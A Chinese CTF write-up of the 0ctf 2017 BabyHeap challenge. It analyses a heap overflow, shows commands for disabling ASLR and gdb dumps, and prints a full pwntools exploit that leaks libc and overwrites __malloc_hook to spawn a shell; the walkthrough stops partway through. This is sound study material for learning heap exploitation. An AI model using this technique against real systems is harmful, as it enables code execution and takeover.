> 题目来源：0ctf 2017 BabyHeap
>
> 参考资料：
>
> [https://blog.csdn.net/qq_36495104/article/details/106202135](https://blog.csdn.net/qq_36495104/article/details/106202135) #思路
>
> CTF-wiki
>
> [https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ](https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ) #payload
>
> [https://blog.csdn.net/counsellor/article/details/81543197](https://blog.csdn.net/counsellor/article/details/81543197) #关闭地址随机化
>

---

> 附件：
>
> 链接: [https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw](https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw)  密码: f1i6
>
> --来自百度网盘超级会员V3的分享
>

# 准备工作
将文件下载下来，首先检查一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604460372924-ba06d098-7d64-4be8-827a-2527b7ad02bc.png)

可以看到保护全部开启~~（这还玩个毛线啊）~~

具体看一下各个保护：

    Arch:     amd64-64-little

> 这个说明程序是64位程序，小端序
>

    RELRO:    Full RELRO

> Full RELRO开启，使整个 GOT 只读，从而无法被覆盖，进一步来说GOT表无法被修改
>

    Stack:    Canary found

> 对使用随机数每个函数进行保护，防止栈溢出
>

    NX:       NX enabled

> 不能向栈上直接注入shellcode
>

    PIE:      PIE enabled

> 地址随机化，我感觉这个保护是最恶心的
>

来看一下我的Linux环境：

Ubuntu版本：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604460976126-e9e1650f-f2d0-4db5-a736-1db853410a4c.png)

libc版本：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604461011526-1f933354-89ed-4752-b57d-c164f20abfa8.png)

libc的大致信息以及校验值：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604461084983-b46ff954-d675-46ad-af7f-d8d51294f3b4.png)

> 其中libc-2.23.so是我本机的libc文件，main_arena这个工具的下载链接见上一小节的文章
>

# 静态分析
整个程序相当于一个堆内存管理器，静态分析一下吧：

## main函数
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604461620274-048b82a2-c7c4-4a5c-ad72-f9e74264a755.png)

main函数主要是通过我们的输入来控制程序的流程，这里就不在多说。

## get_addr函数（生成随机地址）
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604461799695-7946b288-81dc-45d7-ab7e-506fcf305e3c.png)

这个函数可以使程序堆块信息存放在随机地址中，而不是固定的地址，因此我们很难通过找到存放堆块信息的地址来修改其地址从而控制程序的流程。

还需要提一句的是，这个函数有alarm函数，从程序运行60秒之后就会终止进程，如果不想在调试程序的时候被打断，可以对二进制文件进行patch。patch之后的可执行文件名为：babyheap_0ctf_2017_patch

## menu函数
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604462349376-204eb458-25b1-458b-9a79-5e9678dd413b.png)

<font style="color:#1A1A1A;">打印出程序的基本界面，方便攻击者攻击程序（不是）</font>

## Allocate函数（开辟堆空间）
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604462592469-5b066e01-0bbd-4a59-8839-8c15b5d278ca.png)

allocate函数是来创建堆块的，申请chunk最大的大小为4096。

首先输入堆块的content_size，然后调用calloc函数根据输入的content_size大小来创建堆块，最后堆块的信息保存在get_addr指针所指向的地址中。**需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为**`**\x00**`**。**

> **请注意，堆块的index是从0开始的**
>
> 因此程序的结构体为：
>
> + chunk_flag:用来判断堆块是否存在
> + chunk_content_size:#记录content的大小
> + chunk_data_ptr:指向calloc出来的chunk_data
>

## Fill函数（填充堆内容）![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604565426679-e5d20a72-8856-4c02-bcfb-5e207f273188.png)
上图是Fill函数分伪代码，这个函数的功能比较有意思，漏洞也是存在这个函数中的。

在填充内容的功能中，调用input函数来输入堆块的大小，并没有设置字符串结尾。而且比较有意思的是，这次又让我们重新输入了content_size**，但是****程序****并没有将原来结构体中的content_size更改。且执行这个函数之后allocate chunk时堆块的size域没有改变，所以这里就出现了任意堆溢出的情形。**

## Free函数（释放堆空间）
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604565644300-8162b98e-4b74-47ba-bda5-987d2ad5b167.png)这个函数没有漏洞存在，只是调用了input函数让我们输入堆块的index，从而释放指定的堆块。

## Dump函数（打印堆内容）
这个函数的内容很简单，就只是用来打印堆块的内容而已。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604566063024-ee8c21c4-daf4-4498-818a-02e026636500.png)

# gdb动态调试
还记得之前get_addr这个函数吗？这个函数主要使用来生成随机地址，其中指针也存放在哪里。

## 关闭ALSR保护
由于这个程序开启了PIE保护，为了方便调试程序及查看堆内存，因此我们将Linux的ALSR(地址空间随机化)进行关闭。首先看一下ALSR开启的状态，可以使用下面的任意其中一种命令

```bash
ubuntu@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space
2
ubuntu@ubuntu:~$ sysctl -a --pattern randomize
kernel.randomize_va_space = 2
ubuntu@ubuntu:~$

###
0 = 关闭
1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（PIE也会影响heap的随机化）
2 = 全随机。除了1中所述，还有heap。
###
```

 ASLR开启，动态库的加载地址不同：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604568118045-868f2445-41b3-41b6-a2ee-ca197392cef4.png)

---

现在关闭ASLR，关闭方法如下：

**方法一： 手动修改randomize_va_space文件**

上面介绍的randomize_va_space文件的枚举值含义，设置的值不同，linux内核加载程序的地址空间的策略就会不同。比较简单明了。这里0代表关闭ASLR。

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
#注意，这里是先进root权限，后执行。
#重启之后会恢复默认。
```

**方法二： 使用sysctl控制ASLR**

```bash
sysctl -w kernel.randomize_va_space=0
#重启之后将恢复默认
#如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。
```

**方法三： 使用setarch控制单个程序的随机化**

如果你想历史关闭单个程序的ASLR，使用setarch是很好的选择。setarch命令如其名，改变程序的运行架构环境，并可以自定义环境flag。

```bash
setarch `uname -m` -R ./your_program
#-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)
```

**方法四： 在GDB场景下，使用set disable-randomization off**

在调试特定程序时，可以通过set disable-randomization命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是on状态。

当然，这里开启，关闭和查看的方法看起来就比较正规了。

```bash
关闭ASLR：
set disable-randomization on
开启ASLR：
set disable-randomization off
查看ASLR状态：
show disable-randomization
```

---

现在，我们关闭ASLR：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604568747069-d2c1a2bd-0a93-43d3-a4a9-3332ec3939d1.png)

退出管理员权限，再来看一下ALSR

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604568825320-e55f1e25-6381-40ed-a210-ac6e16ec71a2.png)

从上图中可以看到：ASLR关闭时，动态库的加载地址相同。

我们如何找到那个随机地址呢？通过多次对程序gdb调试，发现了一直变化的地址（此时的ASLR已关闭，参见下文章下面的内容），下面的代码框之中是两次gdb调试的内存分布：

```c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x1d0f97e2c000     0x1d0f97e2d000 rw-p     1000 0      
    0x555555554000     0x555555556000 r-xp     2000 0      /home/ubuntu/Desktop/babyheap_0ctf_2017
    0x555555755000     0x555555756000 r--p     1000 1000   /home/ubuntu/Desktop/babyheap_0ctf_2017
    0x555555756000     0x555555757000 rw-p     1000 2000   /home/ubuntu/Desktop/babyheap_0ctf_2017
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fd9000     0x7ffff7fdc000 rw-p     3000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     0xeb511a07000      0xeb511a08000 rw-p     1000 0      
    0x555555554000     0x555555556000 r-xp     2000 0      /home/ubuntu/Desktop/babyheap_0ctf_2017
    0x555555755000     0x555555756000 r--p     1000 1000   /home/ubuntu/Desktop/babyheap_0ctf_2017
    0x555555756000     0x555555757000 rw-p     1000 2000   /home/ubuntu/Desktop/babyheap_0ctf_2017
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fd9000     0x7ffff7fdc000 rw-p     3000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> 
```

通过对比发现，变动的只有第一行的地址：

```c
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x1d0f97e2c000     0x1d0f97e2d000 rw-p     1000 0 （第一次gdb调试）
    0xeb511a07000      0xeb511a08000 rw-p     1000 0  （第二次gdb调试）   
```

到这里，可以猜测一下，程序的指针应该也存放在这片内存区域中。

我们重新gdb调试，通过执行函数Allocate和fill，来看一下这片内存：

```c
➜  ~ cd Desktop/           
➜  Desktop gdb babyheap_0ctf_2017
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from babyheap_0ctf_2017...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/ubuntu/Desktop/babyheap_0ctf_2017 
===== Baby Heap in 2017 =====
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command: 1
Size: 20
Allocate Index 0
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command: 2
Index: 0
Size: 40
Content: aaaaaaaaaaaaaaaaaa
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x0
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x15
 RDI  0x0
 RSI  0x555555757023 ◂— 0x20fe10000000000
 R8   0x7ffff7fda700 ◂— 0x7ffff7fda700
 R9   0x9
 R10  0x0
 R11  0x246
 R12  0x555555554a40 ◂— xor    ebp, ebp
 R13  0x7fffffffdef0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x7fffffffddf0 —▸ 0x7fffffffde10 —▸ 0x5555555553e0 ◂— push   r15
 RSP  0x7fffffffdd98 —▸ 0x5555555551fd ◂— mov    qword ptr [rbp - 8], rax
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7fffffffdd98 —▸ 0x5555555551fd ◂— mov    qword ptr [rbp - 8], rax
01:0008│      0x7fffffffdda0 ◂— 0x28 /* '(' */
02:0010│      0x7fffffffdda8 —▸ 0x555555757010 ◂— 'aaaaaaaaaaaaaaaaaa\n'
03:0018│      0x7fffffffddb0 ◂— 0x13
... ↓
05:0028│ rbp  0x7fffffffddc0 —▸ 0x7fffffffddf0 —▸ 0x7fffffffde10 —▸ 0x5555555553e0 ◂— push   r15
06:0030│      0x7fffffffddc8 —▸ 0x555555554f48 ◂— jmp    0x555555554f4e
07:0038│      0x7fffffffddd0 ◂— 0x0
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1     5555555551fd
   f 2     555555554f48
   f 3     555555555188
   f 4     7ffff7a2d840 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     0xf9ce7410000      0xf9ce7411000 rw-p     1000 0      
    0x555555554000     0x555555556000 r-xp     2000 0      /home/ubuntu/Desktop/babyheap_0ctf_2017
    0x555555755000     0x555555756000 r--p     1000 1000   /home/ubuntu/Desktop/babyheap_0ctf_2017
    0x555555756000     0x555555757000 rw-p     1000 2000   /home/ubuntu/Desktop/babyheap_0ctf_2017
    0x555555757000     0x555555778000 rw-p    21000 0      [heap]
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fd9000     0x7ffff7fdc000 rw-p     3000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg>
```

再看一下0xf9ce7410000这片内存区域，确定是程序结构体中指针存放的位置，标注一下：

```c
0xf9ce7410000:	0x0000000000000000	0x0000000000000000
.....（省略内容均为空）
0xf9ce7410a90:	0x0000000000000001	0x0000000000000014
    		    #用来判断堆块是否存在   #记录content的大小
0xf9ce7410aa0:	0x0000555555757010	0x0000000000000000
                #指向calloc出来的chunk_data
.....（省略内容均为空）
0xf9ce7410ff0:	0x0000000000000000	0x0000000000000000
0xf9ce7411000:	Cannot access memory at address 0xf9ce7411000
pwndbg> 
```

# exp讲解
## exp内容
exp的主要内容如下：

> exp来自@yichen师傅：[https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ](https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ)
>

```c
#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
p = process('./babyheap_0ctf_2017_patch')
elf = ELF('./babyheap_0ctf_2017_patch')

#首先是定义的一些函数，对应着程序的功能
def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
def fill(idx, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)
def free(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
def dump(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvline()
    return p.recvline()
def unsorted_offset_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset

#首先申请4个fast chunk和1个small chunk
alloc(0x10)#index0
alloc(0x10)#index1
alloc(0x10)#index2
alloc(0x10)#index3
alloc(0x80)#index4

#free两个,这时候会放到fastbins中,而且因为是后进的,所以
#fastbin[0]->index2->index1->NULL
free(1)
free(2)

#这个时候我们去对index0进行fill操作,他就会把index2的指针的末位改成0x80,也就指向了index4
#解释一下,前面申请了4块0x10的,加上chunk的一些信息,合起来是0x80
#所以把那个末位改成0x80就指向了index4,这样chunk4就被放到了fastbins中
payload = p64(0)*3
payload += p64(0x21)
payload += p64(0)*3
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)

#然后再通过index3去进行写入,把index4的大小改成0x21
#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fast chunk的范围内
payload = p64(0)*3
payload += p64(0x21)
fill(3, payload)

#改好index4的大小之后去申请两次，这样就把原来的fastbins中的给申请出来了
alloc(0x10)
alloc(0x10)

#申请成功之后index2就指向index4
#为了让index4能够被放到unsortedbins中,要把它的大小改回来
payload = p64(0)*3
payload += p64(0x91)
fill(3, payload)

#再申请一个防止index4与top chunk合并了
alloc(0x80)

#这时候free就会把index4放到unsorted中了
free(4)

#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了
#main_arena与libc偏移为0x3c4b20(文末有工具算)
#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移
unsorted_offset_mainarena=unsorted_offset_arena(5)#这函数还不太明白
unsorted_addr=u64(dump(2)[:8].strip().ljust(8, "\x00"))
libc_base=unsorted_addr-0x3c4b20-unsorted_offset_mainarena
log.info("libc_base: "+hex(libc_base))
#此时因为fastbins中没有了,所以从unsortedbins中找
alloc(0x60)

#index2还是指向index4那个地方我们可以先释放index4
free(4)

#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址
#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小
#这个地址是main_arena-0x40+0xd,具体看后面图片解释
payload = p64(libc_base+0x3c4aed)
fill(2, payload)

#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处
alloc(0x60)#index4
alloc(0x60)#index6

#然后往malloc_hook上写one_gadget的地址
payload = p8(0)*3
payload += p64(0)*2
payload += p64(libc_base+0x4527a)
fill(6, payload)

#再申请一下触发one_gadget
alloc(255)

p.interactive()
```

## 漏洞利用思路
从上面的内容可以看出，主要的漏洞是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下：

+ 利用 unsorted bin 地址泄漏 libc 基地址。（用unsortedbin的原因之后再说）
+ 利用 fastbin attack中的Arbitrary Alloc技术将chunk 分配到 malloc_hook 附近。

## 1、leak libc addr
### 1-1、模仿程序的功能
要做pwn中的堆题，首先肯定要写出可以自动化发送的脚本：

```c
def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
def fill(idx, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)
def free(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
def dump(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvline()
    return p.recvline()
```

这4个函数分别对应程序的四个主要功能，这里就不多说了。

### 1-2、申请5个chunk
由于我们希望使用 unsorted bin 来泄漏 libc 基地址，**<font style="color:#F5222D;">所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能被回收到 fastbin chunk，也不能和 top chunk 相邻。因为后者在不是fastbin 的情况下，会被合并到 top chunk 中。</font>**具体设计如下：

```c
#paylaod：
alloc(0x10)#index0
alloc(0x10)#index1
alloc(0x10)#index2
alloc(0x10)#index3
alloc(0x80)#index4
```

执行完此payload之后的heap情况如下：

```c
pwndbg> x/50gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000091 #index4
......（省略内容均为空）
0x555555757110:	0x0000000000000000	0x0000000000020ef1 #top_chunk
```

此时程序结构体中的情况：

```c
0x5fcead98720:	0x0000000000000000	0x0000000000000000
0x5fcead98730:	0x0000000000000001	0x0000000000000010
    			#index0
0x5fcead98740:	0x0000555555757010	0x0000000000000001
    								#index1
0x5fcead98750:	0x0000000000000010	0x0000555555757030
0x5fcead98760:	0x0000000000000001	0x0000000000000010
     			#index2
0x5fcead98770:	0x0000555555757050	0x0000000000000001
    								#index3
0x5fcead98780:	0x0000000000000010	0x0000555555757070
0x5fcead98790:	0x0000000000000001	0x0000000000000080
    			#index4
0x5fcead987a0:	0x0000555555757090	0x0000000000000000
0x5fcead987b0:	0x0000000000000000	0x0000000000000000
```

### 1-3、free创建的index1和index2
```c
#free两个,这时候会放到fastbins中,而且因为是后进的,所以
#fastbin[0]->index2->index1->NULL
free(1)
free(2)
```

执行此部分payload，来看一下堆状况：

```c
pwndbg> x/50gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2
0x555555757050:	0x0000555555757020	0x0000000000000000
    			#fd指针指向index1的起始地址
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000091 #index4
0x555555757090:	0x0000000000000000	0x0000000000000000
.....（省略内容均为空）
0x555555757110:	0x0000000000000000	0x0000000000020ef1 #top_chunk
.....（省略内容均为空）
pwndbg>
```

此时的bin和main_arena情况：

```c
pwndbg> bin
fastbins
0x20: 0x0000555555757020->0x555555757040 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000555555757040 #index2
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000555555757110 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg>
```

程序的结构体状况如下：

```c
0x5fcead98730:	0x0000000000000001	0x0000000000000010
    			#index0
0x5fcead98740:	0x0000555555757010	0x0000000000000000
    								#index1（chunk_flag置零）
0x5fcead98750:	0x0000000000000000	0x0000000000000000
                #chunk_content_size置零   #chunk_data_ptr置空     
0x5fcead98760:	0x0000000000000000	0x0000000000000000
     			#index2（chunk_flag置零）  #chunk_data_size置零     
0x5fcead98770:	0x0000000000000000	0x0000000000000001
    			#chunk_data_ptr置空  #index3
0x5fcead98780:	0x0000000000000010	0x0000555555757070
0x5fcead98790:	0x0000000000000001	0x0000000000000080
    			#index4
0x5fcead987a0:	0x0000555555757090	0x0000000000000000
0x5fcead987b0:	0x0000000000000000	0x0000000000000000
```

> **<font style="color:#F5222D;">注意：chunk_content_size和chunk中的size字段是不相同的，千万不要搞混！！！</font>**
>
> **<font style="color:#F5222D;">程序在Allocate时是根据</font>****<font style="color:#F5222D;">content_size来创建堆块的，而在fill时input函数并不会修改</font>****<font style="color:#F5222D;">content_size和chunk的size域。</font>**
>

### 1-4、对index0进行fill操作，溢出修改index2的fd指针
```c
payload = p64(0)*3
payload += p64(0x21)
payload += p64(0)*3
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)
--------------------------------------------------------------   
#exp中fill函数定义如下：
def fill(idx, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)
--------------------------------------------------------------  
```

还记得上面提到的程序漏洞吗？

**第一次执行Allocate函数时chunk_content_size是我们指定的，但是fill的时候并没有将新的****chunk_content_size写入到结构体中，并且之前alloc**** chunk时指定的堆块size大小没有发生改变，所以这里就出现了任意堆溢出的情形。******

这一小段payload的目的是：通过fill index0溢出修改index2的fd指针为index4的地址，此处的payload只用修改fd的最后一个字节为0x80即可。**<font style="color:#F5222D;"></font>**

执行payload之后的内存空间如下：

> chunk2->fd已成功修改为chunk4的起始地址**<font style="color:#F5222D;">（这个起始地址是指向chunk header的）</font>**
>

```c
pwndbg> x/50gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
                #payload从这里开始修改堆块内容
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2（fastbin）
0x555555757050:	0x0000555555757080	0x0000000000000000
    			#此处的fd指针已经被修改
--------------------------------------------------------------    
执行payload前原来的内容为：
0x555555757050:	0x0000555555757020	0x0000000000000000
--------------------------------------------------------------    
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000091 #index4（fastbin）
0x555555757090:	0x0000000000000000	0x0000000000000000
.....（省略内容均为空）
0x555555757110:	0x0000000000000000	0x0000000000020ef1 #top_chunk
.....（省略内容均为空）
pwndbg>  
```

> 此时结构体状况未发生改变。
>

### 1-5、对index3进行fill，将index4的大小修改为0x21
```c
#然后再通过index3去进行写入,把index4的大小改成0x21
